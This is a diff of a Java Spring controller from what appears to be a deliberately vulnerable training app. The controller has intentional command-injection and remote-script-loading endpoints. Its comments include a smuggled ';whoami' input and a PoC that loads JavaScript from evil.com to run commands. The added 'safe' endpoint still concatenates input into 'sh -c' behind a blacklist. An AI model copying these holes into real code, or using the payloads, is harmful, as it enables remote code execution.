@@ -1,14 +1,12 @@
 package com.best.hello.controller;
 
+import com.best.hello.util.Security;
 import groovy.lang.GroovyShell;
 import org.springframework.web.bind.annotation.GetMapping;
 import org.springframework.web.bind.annotation.RequestMapping;
 import org.springframework.web.bind.annotation.RestController;
 
-import javax.script.Bindings;
-import javax.script.ScriptContext;
-import javax.script.ScriptEngine;
-import javax.script.ScriptEngineManager;
+import javax.script.*;
 import java.io.BufferedReader;
 import java.io.IOException;
 import java.io.InputStream;
@@ -31,7 +29,7 @@ public class RCE {
 
     /**
      * @vul 调用ProcessBuilder执行ls命令，接收参数filepath，拼接命令语句
-     * @poc http://god.com:8888/RCE/ProcessBuilder?filepath=/tmp;whoami
+     * @poc http://127.0.0.1:8888/RCE/ProcessBuilder?filepath=/tmp;whoami
      */
     @RequestMapping("/ProcessBuilder")
     public static String cmd(String filepath) {
@@ -47,6 +45,7 @@ public class RCE {
         // 使用此进程生成器的属性启动一个新进程
         Process process = null;
         try {
+            System.out.println("[Vul] 执行ProcessBuilder：" + filepath);
             process = pb.start();
             // 取得命令结果的输出流
             InputStream fis = process.getInputStream();
@@ -56,7 +55,6 @@ public class RCE {
             BufferedReader br = new BufferedReader(isr);
             //直到读完为止
             while ((line = br.readLine()) != null) {
-                System.out.println(line);
                 sb.append(line);
             }
         } catch (IOException e) {
@@ -77,12 +75,12 @@ public class RCE {
         try {
             // 执行命令
             Process proc = Runtime.getRuntime().exec(cmd);
+            System.out.println("[Vul] 执行runtime：" + cmd);
 
             InputStream fis = proc.getInputStream();
             InputStreamReader isr = new InputStreamReader(fis);
             BufferedReader br = new BufferedReader(isr);
             while ((line = br.readLine()) != null) {
-                System.out.println(line);
                 sb.append(line);
             }
 
@@ -122,26 +120,63 @@ public class RCE {
 
     /**
      * @vul 调用远程js脚本程序进行封装
-     * @poc http://god.com:8888/RCE/js?url=http://evil.com/java/1.js
+     * @poc http://127.0.0.1:8888/RCE/js?url=http://evil.com/java/1.js
      * js代码：var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
      */
     @GetMapping("/js")
-    public void jsEngine(String url) throws Exception {
-        // 通过脚本名称获取
-        // ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
-        // 通过文件扩展名获取
-        ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");
+    public String jsEngine(String url) {
+        try {
+            // 通过脚本名称获取
+            // ScriptEngine engine = new ScriptEngineManager().getEngineByName("JavaScript");
+            // 通过文件扩展名获取
+            ScriptEngine engine = new ScriptEngineManager().getEngineByExtension("js");
 
-        // Bindings：用来存放数据的容器
-        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
-        String payload = String.format("load('%s')", url);
-        System.out.println(payload);
-        engine.eval(payload, bindings);
+            // Bindings：用来存放数据的容器
+            Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
+            String payload = String.format("load('%s')", url);
+            System.out.println("[Vul] " + payload);
+            engine.eval(payload, bindings);
+            return "漏洞执行成功";
+        } catch (Exception e) {
+            return "加载远程脚本: " + url;
+        }
     }
 
     /*
      * JShell
      */
+
+    @RequestMapping("/ProcessBuilder/safe")
+    public static String processbuilderSafe(String filepath) {
+
+        if (! Security.checkOs(filepath)) {
+
+            String[] cmdList = {"sh", "-c", "ls -l " + filepath};
+            StringBuilder sb = new StringBuilder();
+            String line;
+
+            ProcessBuilder pb = new ProcessBuilder(cmdList);
+            pb.redirectErrorStream(true);
+
+            Process process = null;
+            try {
+                process = pb.start();
+                InputStream fis = process.getInputStream();
+                InputStreamReader isr = new InputStreamReader(fis);
+                BufferedReader br = new BufferedReader(isr);
+
+                while ((line = br.readLine()) != null) {
+                    System.out.println(line);
+                    sb.append(line);
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+            return sb.toString();
+        } else {
+            return "检测到非法命令注入";
+        }
+    }
 
 
 }
